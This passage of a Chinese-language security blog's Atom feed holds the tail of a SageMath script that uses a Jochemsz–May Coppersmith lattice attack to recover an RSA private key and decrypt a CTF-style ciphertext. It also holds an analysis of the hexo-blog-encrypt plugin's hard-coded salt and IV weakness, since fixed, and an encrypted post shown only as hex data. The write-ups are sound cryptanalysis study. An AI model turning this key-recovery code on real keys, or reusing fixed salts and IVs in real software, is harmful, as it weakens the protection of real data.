Found z0 = %d&#x27;</span> % z_root)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for `y`</span></span><br><span class="line">    y_roots = <span class="built_in">map</span>(<span class="keyword">lambda</span> t: t[<span class="number">0</span>], H[<span class="number">2</span>].subs(x=x_root, z=z_root).subs(y=yn).roots())</span><br><span class="line">    y_roots = <span class="built_in">list</span>(y_roots)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(y_roots) &gt; <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(y_roots) == <span class="number">1</span> <span class="keyword">and</span> y_roots[<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&#x27;[-] Can\&#x27;t find non-trivial solution for `y`&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    y_root = y_roots[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;[+] Found y0 = %d&#x27;</span> % y_root)</span><br><span class="line">    <span class="keyword">assert</span> pol(x_root, y_root, z_root) == <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> (x_root, y_root, z_root)</span><br><span class="line"></span><br><span class="line">n = <span class="number">58088432169707511884530887899705328460043341752051203523596713643978064163990486003388043207708974302843002172264417411586749486956628013574926573715095249317804208372132481594468281365459316852927039797580064466731086129431102303726096683810636192790138689214881951836298576801818592777778548978736174404573637727968467102304994883348510912250960513170991711142297420921866513951251779528983034404550484931629702384165892697556071097115581299228167852394258387798734409094231193145682416393190929132395057494573898497863918989076392413537702062176268786330410635086565380004463707094857932051066439903977555824218219175469965671350998705376046031482320586719742092257095632485346554447599297796154806971819544073874759609887168714861438380508381072200369356855424637087904990126639040356052220595703217836390163784968964557550834138598331720685971193948909145336792118311346853933919997080542485529346554810899612986872128053464963893904969598870571593590391792680177336466285483108769678524923709955832516312592396932275858180384073997491565078915852990631405792518132787289319255490058314797418779789436482247156880548274241414788581503832731423362447015575598719157544932430682335826661205441977262084135022109705809490179219483</span></span><br><span class="line">e = <span class="number">1296863142627338816011174237898978985407338763709131570002553514972553044428195580769854555546152719732990573444787592853632636242677007643888487629752955065888264014132275294946697123213980215879592216819850992977582758776020797257958443371755687921634978634111557036569863976062810460472490135115734285081745257140890782551910267112228842110620084653440977034007333330590567591507504424149155838966172077983891168269103390479149309815192817914537419492632845858394205854892694802909512194639800529863998537677351955149803841057222279150345376221210193853988829004456607875070080035867353641697190133291884195010172677474092272163240020759433657106746641878734177642792083528380007586872967990567342937466301144028345682953828338178443155</span></span><br><span class="line">c = <span class="number">16752688445992597693492078768792988158064245788490841004088700531099790536110447985923645388328978598918558573058666020752484085376750645920339841721965079433955597051770967985244844142502867651653937397609501854590348737333886080652220527816829409949342731486933197221896957534095862738894180358847113397085352739280484473781105412902120746843518141064227815586490173586590816604826188741474912189470710829803523377024132104491423108113497334941368230382051634727609001152617358942201879845045218836779639253498499815164099738639536103677828973445421741990132435162229847121113067305553125456102367833209883862574433343054494403402942865858273752590543256912451674260568595630772845863280356673914311032101592460580258363122918410617942433477032366206849438716812374524146273199242870667580346229125800066983929229036090475897273116326252901163310893757592468684517304717063925001322227024645779923535448521921111520336345056548259711472788891467777369226660588848284132193326948102214348764076553879941966538872384437359308388683625433227236271678080771257212907044825226381230194582232438875515978892368369803853787442589487796945615448231745137876193113566019341508962555358522784268738179046402147785632513268769395719591200620</span></span><br><span class="line"></span><br><span class="line">gamma = <span class="number">0.4</span></span><br><span class="line">delta = <span class="number">0.1604</span></span><br><span class="line"></span><br><span class="line">PR.&lt;x, y, z&gt; = PolynomialRing(ZZ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Maximal value of solution `x0`, `y0`, `z0`</span></span><br><span class="line">XX = floor(n^delta)</span><br><span class="line">YY = floor(n^(delta + <span class="number">0.5</span> - gamma))</span><br><span class="line">ZZ = YY</span><br><span class="line"></span><br><span class="line"><span class="comment"># Norm of polynomial as vector representation</span></span><br><span class="line">WW = floor(n^(<span class="number">2</span> + <span class="number">2</span>*delta - <span class="number">2</span>*gamma))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Some Non-negative real ([SAN10] 3.1 (11))</span></span><br><span class="line">tau = (<span class="number">1</span>/<span class="number">2</span> + gamma - <span class="number">4</span>*delta) / (<span class="number">2</span>*delta)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Powering degree</span></span><br><span class="line">mm = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Target polynomial</span></span><br><span class="line">pol = e^<span class="number">2</span> * x^<span class="number">2</span> + e*x*(y+z-<span class="number">2</span>)-(y+z-<span class="number">1</span>)-(n-<span class="number">1</span>)*y*z</span><br><span class="line">x0, y0, z0 = jochemsz_may_trivariate(pol, XX, YY, ZZ, WW, tau, mm)</span><br><span class="line"></span><br><span class="line">d = x0 </span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n) </span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;



&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;0x01-RSA私钥过大的漏洞&quot;&gt;&lt;a href=&quot;#0x01-RSA私钥过大的漏洞&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    
    <category term="Research" scheme="http://example.com/tags/Research/"/>
    
  </entry>
  
  <entry>
    <title>hexo_blog_encrypt_analysis</title>
    <link href="http://example.com/2024/01/28/hexo-blog-encrypt-analysis/"/>
    <id>http://example.com/2024/01/28/hexo-blog-encrypt-analysis/</id>
    <published>2024-01-28T08:05:31.000Z</published>
    <updated>2024-01-28T10:43:34.691Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。</p><h2 id="0x01-探索"><a href="#0x01-探索" class="headerlink" title="0x01 探索"></a>0x01 探索</h2><p>进入一个页面搜集信息。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281608581.png" alt="image-20240128160800457"></p><p>给请求过程下断点，开始调试：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281749426.png" alt="image-20240128174904306"></p><p>于是追踪到相关逻辑。接下来，进入分析工作。</p><blockquote><p>也可以从<a href="https://github.com/D0n9X1n/hexo-blog-encrypt%E7%9B%B4%E6%8E%A5%E4%B8%8B%E8%BD%BD%E5%BC%80%E5%8F%91%E7%89%88%E6%9C%AC%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BB%8E%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%87%E5%85%A5%E3%80%82">https://github.com/D0n9X1n/hexo-blog-encrypt直接下载开发版本，这里从样本分析的角度切入。</a></p></blockquote><p><a href="https://github.com/AL3XEI709/Symmetric_Cryptography/blob/main/hbe.js">node_modules\hexo-blog-encrypt\lib\hbe.js</a> </p><h2 id="0x02-hbe-js"><a href="#0x02-hbe-js" class="headerlink" title="0x02 hbe.js"></a>0x02 hbe.js</h2><p>部署在hexo中的文件结构长这样，很美观：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281756666.png" alt="image-20240128175614617"></p><p>直奔<code>lib/hbe.js</code>:</p><p>文件开头：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281812675.png" alt="image-20240128181206595"></p><ol><li><p>严格模式声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure></li><li><p>常量声明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cryptoObj = <span class="variable language_">window</span>.<span class="property">crypto</span> || <span class="variable language_">window</span>.<span class="property">msCrypto</span>;</span><br><span class="line"><span class="keyword">const</span> storage = <span class="variable language_">window</span>.<span class="property">localStorage</span>;</span><br></pre></td></tr></table></figure><p><code>crytoObj</code> 用于访问浏览器的加密功能，<code>storage</code> 用于本地存储。</p></li><li><p>加密相关参数：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> storageName = <span class="string">&#x27;hexo-blog-encrypt:#&#x27;</span> + <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">pathname</span>;</span><br><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br></pre></td></tr></table></figure><ul><li><p><code>storageName</code>: 存储加密数据的键名，基于当前页面的路径。 </p></li><li><p><code>keySalt</code> 和 <code>ivSalt</code>:  用于生成密钥和初始化向量的盐值，通过 <code>textToArray</code> 函数将文本转换为字节数组。</p></li></ul></li><li><p>解析 HTML 元素：</p></li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mainElement = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;hexo-blog-encrypt&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> wrongPassMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;wpm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> wrongHashMessage = mainElement.<span class="property">dataset</span>[<span class="string">&#x27;whm&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> dataElement = mainElement.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;script&#x27;</span>)[<span class="string">&#x27;hbeData&#x27;</span>];</span><br><span class="line"><span class="keyword">const</span> encryptedData = dataElement.<span class="property">innerText</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HmacDigist</span> = dataElement.<span class="property">dataset</span>[<span class="string">&#x27;hmacdigest&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><code>mainElement</code> 获取 id 为 <code>&#39;hexo-blog-encrypt&#39;</code> 的 HTML 元素。</li><li><code>wrongPassMessage</code> 和 <code>wrongHashMessage</code> 分别是用于显示密码错误和哈希校验失败的消息。</li><li><code>dataElement</code> 获取标签名为 <code>&#39;script&#39;</code> 且具有属性 <code>&#39;hbeData&#39;</code> 的元素。</li><li><code>encryptedData</code> 获取该元素的文本内容，即加密的数据。</li><li><code>HmacDigist</code> 获取加密数据的 HMAC 值。</li></ul><ol start="5"><li>辅助函数：</li></ol><ul><li><code>hexToArray(s)</code>：将十六进制字符串转换为字节数组。</li><li><code>textToArray(s)</code>：将文本转换为字节数组。</li><li><code>arrayBufferToHex(arrayBuffer)</code>：将 ArrayBuffer 转换为十六进制字符串。</li><li><code>getExecutableScript(oldElem)</code>：根据给定的元素创建可执行的脚本。</li><li><code>convertHTMLToElement(content)</code>：将 HTML 字符串转换为 HTML 元素。</li></ul><p><strong>密钥的生成与处理</strong>：</p><p>在代码中，使用了 <code>getKeyMaterial</code>、<code>getHmacKey</code>、<code>getDecryptKey</code> 和 <code>getIv</code> 函数来生成密钥和初始化向量。这些函数使用了PBKDF2 导出密钥材料，使用 HMAC 进行数据完整性校验，以及使用 AES-CBC 进行对称加密。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281825214.png" alt="image-20240128182522073"></p><p>加密过程中，使用 AES-CBC 加密算法对明文进行加密，并使用 HMAC 对加密后的密文进行签名，以确保数据的完整性。解密过程中，则先使用密码解密数据，然后校验 HMAC，最后返回解密后的明文。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826731.png" alt="image-20240128182613626"></p><p>在解密过程中，除了解密数据外，还需要对解密后的明文进行 HMAC 校验，以确保数据在传输过程中未被篡改。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281826027.png" alt="image-20240128182653973"></p><h2 id="0x03-存在的问题"><a href="#0x03-存在的问题" class="headerlink" title="0x03 存在的问题"></a>0x03 存在的问题</h2><p>在分析源码时，我注意到一个细节：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> keySalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt的作者们都是大帅比!&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> ivSalt = <span class="title function_">textToArray</span>(<span class="string">&#x27;hexo-blog-encrypt是地表最强Hexo加密插件!&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>PBKDF2算法使用的salt每次都必须是唯一的，AES算法的IV也每次都必须唯一，否则会存在字节翻转的安全问题。</p><p>不过，这个漏洞已经在去年九月提了pr, 目前官方最新的版本得到了修复。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202401281832925.png" alt="image-20240128183255815"></p><p>如图，将salt改成了一次一密，并在所有主题下加入了<code>keysalt</code>和<code>ivsalt</code>两个变量。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个插件的开发者有一定的密码学基础，在 hexo 渲染和展示时将原文用AES进行加密。但AES的具体操作上存在安全问题。</p><p>这是笔者第一次做js代码的分析工作，感觉动态调试的作用相当大。与之类似地，二进制可执行文件的逆向工程也常常可以通过动态调试获取到一些关键线索。同时对于解决博客加密的问题，以前一直考虑部署在服务端情况下如何实现（并用Go写了demo），js的强大功能令我耳目一新，用短短二百余行核心代码就实现了加密&#x2F;解密&#x2F;校验的核心功能。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;


&lt;p&gt;hexo-blog-encrypt 是一个用来加密 hexo 博文的插件, 其核心的技术点就是在 hexo 渲染时将原文进行 AES 加密, 然后在展示的时候使用密码进行解密。&lt;</summary>
      
    
    
    
    
    <category term="dev" scheme="http://example.com/tags/dev/"/>
    
  </entry>
  
  <entry>
    <title>An_Interesting_CTF_Challenge_0x1</title>
    <link href="http://example.com/2024/01/27/An_Interesting_CTF_Challenge_0x1/"/>
    <id>http://example.com/2024/01/27/An_Interesting_CTF_Challenge_0x1/</id>
    <published>2024-01-27T07:06:50.000Z</published>
    <updated>2024-02-21T08:39:42.039Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="914607b84c8d4dd7972619106a7ce0952666c15c578521cfd7888493f6bfa990">bcb6b2850ab6fa530bd55a5aec2e37705b2edc8b475085f6b44bb744ab7dd3c87e9fae2d97d00cfb37df23166415df5f610ff9964bd7e3e05207a5955b325048b293c326ada7b7688c808ff2c424930dc9703cbe22325d544a6f3fc424a2d5f4ef8e46c7758c2f505c85b37c8f5d300c0a1351a56d6a783cf6f8666876d41529790f9827f29347ca95af4ff57d6a5912470ee44be8cc43c80a596c2a0618751374a8b41a67212a7d64c279b37b5ebd54c0f445b14c363ea200e26fe752ed29861f47fabd871ea72e439feaad61e4ad969bf5d2290a847dc3f813875c7ef80a27c57fe256f133e82060fe56f0ae021da1e9b740cab1ee2a6964ba2945f04a2a7ff413eb46cbf3a06c56b9a33ba682b6b770f2d353f19ad890fb73e6b9b7c8ca5c37847e90fafff5ed7be3aac559ce571939f3a33a1beb7c933b36f9997b704edb25d97d69184b74680eb6eea84b2694aeaa545b7a0ef36e26166d0d6e26ca3753a40478b283bd2ef1bd682830ae63c7fb6aa3dd45b586f3f2c9abf54b4a2a05adf30a806e0d83bf71d5f766e1f39baac6b08a55c0c072325a2e95b672c95dfcfdf6ea41c21e373cf0ad45fa12385167bde52d50d2c9bd13964c7f4aecc6e778ba8839f5c4473cbdfc4bf37e1f281958b33911a797fb42fdac591a813a470938714c79c3e6abd618c6993c51c8d27404f4302a01a3cc7381a2aeec9eb3b890b1ad6b7ec1ae3c54a9a0bcd79b1cd079b686ba5c4bbe908699584c6fae6f2970625adbb9e8ea179a7dad9969616114e75cf8473193f5dfcca70720e261567922a48c1b3174ded6198943601ffe6317e48b775706b43f4d44eb942cf9341d013526019e2be285d1be205ade6e2fd42eaf0d8ad2e82c2e2dd35b5c175677895d5ea95364a0a99aa0ecb98ec444a2c3ffccb756c125e8e57ee531914e26589006abcf4c7c699a4c476c38de71faadf40a5e7546c23218486468087b5061de84b14ce022da649effa787e3876019cacc4e23253eafa71c6817113cb0ee7b4266611c6b026e52416bc27eb1303cbf0d756fce8ae7b982909b56949f0039d77aa3370cea09592cae7a7523ceb7bdc564591c66a0437d784c144ea978525b6de0d308aa7aeaebde02c064fd5bba565ecb85664a7f676c96dd279ef540434b4e16e2be1a8cafea230ee1aaacc717441950231790693503cdb4af45a324c417a7e593879388493ab48d5e9b8c8e34c758315011b3e7b266f3ba453923bf405a38efa04f027ae126928cffb1a6cfcc9f3943477ec27932652248e2442395076d133e5108348102f0172a43e04032a3f8ad7078aee5cc20bfbc90e60ce087d003e363369b861846b4f810030551516a6b8313bcb484d2d2a6a608982f9ea8982dad16b8cd31294120bab8d2811960b2fd4795196a9b5dff03796df96107c9d462253fa29d23d94a8110d5898f9a1197d470d94b1fb825843812748766329326c5589bf469751be1e01d403fc78c4d605c7b8fb9f198d659db19965fbd1816151724f645041289dcb412d8974d8cdf1afd3cf136fbec83d9ca6e7c32714aaafdfff1dc03f205f469fdbed70d4db69f63e3eb1e5d149f9b2afbe0887201c06beb06323c5f9549ca6654f16c0421f76f78738b14d9503ab7fc431a8491ea0c04fed6bc5de15f39b68fd6a5a992a12c2fc63ddee320f77b3655871e1c3eab193444d6fbbd813388c8533f7ad11e0bb14bbbaef02cdfeef6416f0d58bb1eec6bde21939d4ab30f8206c5f9c41457cfd19abca9ffa11ed9a5dd24de16e55f3e9da55c0c60bb6dfc9aeaf22e773ff019880f327366f5e2df4d929d9f122e9e7e314c155283f7c1965961d36146bbb1dc11ae31ae8a2bf4df4963a574ce39986b8debc855a83717f6b47c2f57b27df770b5916163a45caf9464a5443390f897fd189bf0d917cf5348d70f4f901344e78f4acaa9d06a182d4c08b0acd999d66293957ec89dd69800b6f9462b5490f952f8443b96e0282017d2c6e6d7feed6f99ddb85b1bd7d5218425071f7690590dc071ebedc4e464f13521c02a6221ba618acd1e795b7ce0d2a7a707cdc35b94021554a65f3a21b6ad3d98b70abf2fcfa3a72075a3b1dc73440667119c1f9bd425e6eb0873e943834c008ca46754d33fd3a678648d50bc461899bddba8750078020ea169b7f52fdf55f6a2afabab6edf522bb3d2b0335b3c19ec7c32eb20fd9e696bca2e7db76ad292955e6ba1dad8ce8118b6a8350eeb36e4c60ba2495c138c823833097ff09f58512b591a0bb0e23e11d81a79f3d496563ba2d66d5524c3959411eff31f2563c5e0b7665221ad1be06947946a06d5849f0ee27d7aa26b90cb736f067dd77627ed960dc3118f1447fcbb6e91e4317fb16a840c1d57a46d03e7c6dc67bf7010dee6fe83cc0cf091909b73f957475a1b2741dad07cc375ad3552980a0ae4cf52c9e42f4693044e893f4cfb34b9e0bbcba4cf6837ba92b71424f95d5ee5c26be9cf713ca76e7b8c1322ed3c330f68f53af664c79fc14586318f1c84e5faf967ef1d0ea8374f97d25a19a1ee1a9d5d4efb57973ca0624b4d31e77385c7fa305616187d90639d88d59ededb75578b6ca038c73227b2e2da1d1823dc168fb398a58dd7670b0f1f8b344b862537451dec2bdd3d2391a168e05751b668544f03d417bc53fdf3f2c95967d2a50938a1cd254f55fe721bf4e2f0ad52c28504897dd691eb8fbe9ec79c18107c54108bc038463f80d45e5bdd069b407b7a9953bb9b939bef15119a55ff38c7989f154937e600615ff6ed10b4bb9f35ed5ed84305e8bd2b513b9e06744f9a304125b85c9ab3c1da0c68142b4e4dc03c5b07863dd30b145e4d066002a7921bc80c27969cba32525b74fa1de1a5b0036422895f5bb5608da576600dd741d049c5ee935251b69104ebdb3c9a43587fbcfd0a12d0057d2ab1ef9616b4a104a91b28d3d672e39aa4b09a9f6fd708d080004c3925d6141e4f81821395f8268d648b8c453bbe3295298e7fd0ed10d54ce5d71ad2517fa55ef81c0e692cb829cdcbbc76fbb60679921738186bfa7409bfde012836949798a910922beba72973897c6ef4f3d0a4b6703b2e5e2cef0e96c9863624010e447fd4ab07740afe07aa383d7f8cce1affb62edfed3bf7340ce194247a8a1aeb2318159f5a3503f3d481714302e4d2ee995e35a6c1f1f490321b172b1d0fac15e825b17ecefb9a7943ea503ce7e553100b3f6b53cd213040c20eee892e36716fd1d6bb36efbe5d3a1906bfe59b92f7d0d60276672528ad8a7cbe4dd5bfd4fcec5c2e4692c59e80658e6fcceb0d2d9d50f566b7bd9f5a04127dd09c891069d9fd7712a9731378f55a16b092c8561cd9684f9a3fe9680bad4e80cbc468d50b97ba58563a876fe8805ba4bb166d4fe55b3347fc56ca22ae4346b3c5b5f223f97983423a074bfdb6c8cf4b7256094b37321ec6c7147580e7b5733d421913f7bb39e65298cce7ca9b9fa99ffa134f68cdb529a43205c92cd6f7b87019f944fdcf7695c5e9546dd51fb15749c172702c4236400f6b6b55d6598c78db16735f7bebddc709d551606a5321cda1798601f5edc7120160b7e83121c0884b63e7559bd80bce8b64d732a7b68e4703ef13e44616ef511bba27cb5890e9fb4cdc4c569637c21c55ccdc2fa2f7c64fe7ebcc584171ce0643ae132e283cd78db9f9aaf2ea039a9ccfeecac1303fe4d1d9564102cd382b8a97c7aa961d541ddce0b02e3dee8d483fcecf3f0fefcf99ec53e5f90fdb246bfa099286664e2542f3359324d89d011b4bae0727cd3067cc787d5e72f923752a7c6453495fa9e3786d3c4901e2af7f10a1e7d73b91f7e52314450aeabf624f225c4c03bd70c0568beab20ff43f937cb4d218df9a639de1c548f9ff5a3f03ce438ba4100af2130a0d7777441cf0aea0959d569ee36d0775e145b90e9671235b53cffc4c9991ce5643725577d9046ee3a0827105f27b4cc379cb87a3e66f9f0e776d3062eab999e3fb92708defed74659389f93285af0e0bd3191ff8514752fd342aa9edeb34fd35623f0e9e92f3474670182f13661cde7b81ce27acaabbadc45cce55924ab64721ff69b25a4dd17f208b35926c4f899b413f3c3d95a16a795f7b7e596af0a564f0164e5acf9e13693498dfb4046bd18f4c2c37766a928170f32c4a73b0a1d72f70a13f9adf2ac4c02b329d6dcbb8b731de248fd0c0e8db255c0df5daae27629dbfa476e9c3f9dd0ba22b4c82825dd45acda5ea24e486e2cec3a8a961a36a0e28e65f596e0d870b2d8953d6eb277ecf7263e80122fced8ef18a2574c25a024ef86a4514e76a5440033e455a217901ba1a708d37073f74b7fac5693273a1ec6e216f1a3ec6f9c053f499a2769b56298dddeeac18ff4a22315f6eb7ced4fbe380fef4eace20c10220c50d9697b1b3e1daf3943684880abe87b1591a773a4ed116b679342cd61c1375ca46bf1aa82282437f926c889f88da0aac6d09ee055ef80f05d348252a23c124953a801e366b04a8acc09155428b2b8378146a8d4be1eee98db22f6f9d9c7bf8cf743675c0501dbfcbabe20b5f013b5a32bfb8dc953e869a76d3d94798173954c2c461a5d7826dbc3c4d85392d6bcac940aa5be93275c9e3ead6e8c9f66d932ca62433e3a5c060bdfbda4d8a413109eccc728da186790d47ea8d7d5df1a69bed47440e1261b59b5a9bbc13e0cce40317f59686ee48dc8ec047453ed250520ba5ab24588117db9d413084019d458c2874ed23da19b048a2635755bd981b4206c996b518e10a8479096e4f9265432d4b93def1d0025d01e78dd81e7d30f25a5665e760195ee63352d874596f2e4a1447d93975e83e7d4c3faecde1b27b8ebbf7bff963fb499db1be9e7ba26f683464b82ae0c81c6c090fc76be34a9e5732266042579c984050d84a5a95d0f306f7df991c0837614266b0ac029528c0c09d45744f41b41ac480d62767b6b9355e42b246453ffef236f02c37568b7d34685c4065ab71a8c439b24e7b3224b99dc0193a79366950b16f4c144fc773f3d6feaa4746f7f3eb105e7f44d4000d8a449937848eb4458757581be8ca45c6c56db42bc0d7241b8f630f265ea8b1c8b0f6c93312a9d9828b398f18e8d575be70d8c917f8b81d3f90351f63d58516606ce6c589a293cd559f55b61f1d3652516d59bda491b61d06b70d07e0886d4db41310daf574a81666269cd37aea6b591ec3abcf7d702bd6a8a00541becd20e50fbe17b4da64d2d1fd8d1e8708f686d9aad84cc1b76fd61c552f8a40ba32633b3abf4f257f06f68cbebf939b1d6a022d1b1547c09eb340572cb0c5c468136b3d821ce676973b2bb92e3abf15030f6a54ca9ddf8f19003cfccc3f4bf9be6733c698b482a1b50da3ff9bc994814b7bfdfcb90aa3e5f8c99cd95cc40c70466835ee30b672d6ea61e70248c79d9fcdf5e3c9ed32f12528ddbadc3bae3b8302db4450b01f5b2f4b7e79aff241b3c06ddca1006051949e1925ca8617ab65118d307e1535fce11bddf46518196ea5e825dd85bef15af196560a95866e17afe16d75adf6f73cf615092a600d6ea106d9dae716b4e17edb6c58eb4143ea82495bdd8f2c33f586c106ff590404d4f3ce34da8f3ee3fe8c43de1670f3a484b702992075762a27778951a3f221d3168edc550354cbf25fdf00c2c903c28ce86fff678195089a38b3e24d7c5953117adea8aba59068a9540d9088ed1a0107980a9c35a5096e4c6174c6381291659db12b678b652a8d920dcf848b875d6bff69a0c56f09db3a37297959b807dbe7658537755ed831e035bf39ccb86bcf5d3b6a975460be9f306094debd17971523b5e3464780eae14841e249289af2ae535ad00938082c3616b2d18ed49bc021aed5e4a93e2d0ab7b42bda1d1f2c68ed4f54a27a9a39a52e0cc3af443496a92790e8260ad287020749f2b408c0bceeead60607f33b380adc544fcfe632b04f1ca1d9de6fa0cc68ac4b60a0f68f0316eafd4c79734b465098ceadee98c8e7dabf379bfd752243103c6837f183023a4897afc3a9c5fd0a8957a2b1257420668419c0ed6e042092f8b90fe6882e5ac810b45cccc92c571f9cbe764a13172bf696d07505382d35171214f6b624b85cbbd5811f330ada0695c84fd23d1fb4ea4b0d81fb59ce2f4ff857e3763da7a41511ccbe34eb12bd175b3f483e8e91adff7f4acba54d7a2119d7e3355290daafd7a793a8a233acd83c65e2adbb6050dbb0b8f3f4248a77c06edfc60e93089362ca8b481e0bc51e64fed3ea022a73e0f27879f194397f5327e523f35bf0bffc9c25e3cd89e6ff8fa369c5994396033bfa4664767b3286feb89303e09a12196c8dc7d9b7a56955ba5454d1bcbecb292d8f88ed414b53866211b2cf95e948eb784688f314ed6519ce5d99f767fd9be2151085865e204bbe708f62f1929bc33003b523cc2a2a785e6297d7716f7e6840ce4cdbf2945ad09e82bb72b452e54aadfb80c615426f027c2b828edb0fe1e9deb52736fc4e63a363629134d98686df27921601335f1fdb162783d73b0c004e796a4d3b3fda4b8579dfd79bee47f1d852448d1c424515f8e1a2a1a2b5062198d34cd8e203d6920b61c5af73c6775b448365e04f59d7b2d7186bc213c9fa1d66d0db4d19bb4fd8e070c7dfb69d02ab1958c250d5d5d6581376bfd9e1c22e688d05b1c2a0b010ed47072d9e4f9e27201ed485ff479aaaecb8627f0a82e4a5fb9c464d41d72f5bb065ddff5dfc58573acfe714f3b4c31321fbb22150a4a7de9f55b3749cf46cab899bf18a07b3330fd1603c6bbaaf29714cb4a7e10d04f1d76ec226042eb642b05f03cce27d266c6d3c733409f4b127d1567379d4d59ab8d970d066ec2ae5fdc203ae8e9c34f4e9598d6a458e5a4287883c8db19bed5f60f4d6d9fc61700f1071d4fa3273ba0bcfbe090a535eb1be38b961c36e153c232671c8e039713821f2bf11e7d98a621adf229496e9d15d7f2992649a0cd5cf8ca961f290eb9c1ef1d41d5fb7e3a0ebc9fb01f6b1475fe79794613f530b76b9660e3e39575d69e95acd8e1c347962aa9970385bce736dfa5e16c35ebfe1b0df1dc5a7860926b4db88eed50bb7fd2726443d8030d2816e0ad10587a57acfba80e6200d2b81963f712adf5e4668b21740f7f9c86f52fa25fbc3f8234b065c1b18bb94acd8550f07f383c7c79483c54fc51af798d7c040539663b63be3688d3feecfbed0014058869df50d9060a94cce975b4077bfd97c7b0908b5b07611a7a5fff33aa90a615f9368833709d79916efc478db4e6cb5a2c7111bd9300674691ec727cf7c0a7ba9e82df7acb69d99199211fb52cd258c5b7082a035869b74422f6cd25acbb70fa92d195e91340b5652d484a347c795ebedd1d7e67c3ac4c20f4cbf59a4c8cb904762df8e6b1af1831341e54acd8aae56c0435dfe39d783069710cffbeaf84be8a985330026d25aaee8cc654490ec3df222b61ada7bf648b66afa8d695da8b811c4c4ddefc2b6720772e323641f62c1bf5e08ac7b425245b252b1c1eb1ecabe05012698405d394c78af1394a5824883d3d8b9d0ddf76c4ad36392d52f6377aa58ba959e33bdc9805aab7598ec55bd04c3b2b50859d3dfc88162f7bb5d830f3d2040a3108dbcb7816ec117048a3afdacc81247e80c82791818c42a4e5b08a445791eebd519fb8954d1c948b93bb3290bd9ea07debd554f4f611bad1c0c6d1ffca59a7f51fce0f15359f3d5bce68e47186e55db9c605782d87142e65cb403eb402418a7cbe869ee08544b42809c460480cfcb56a7c4aa2760692632f4c42594c096b61d17956911586f7d423b69cce223ae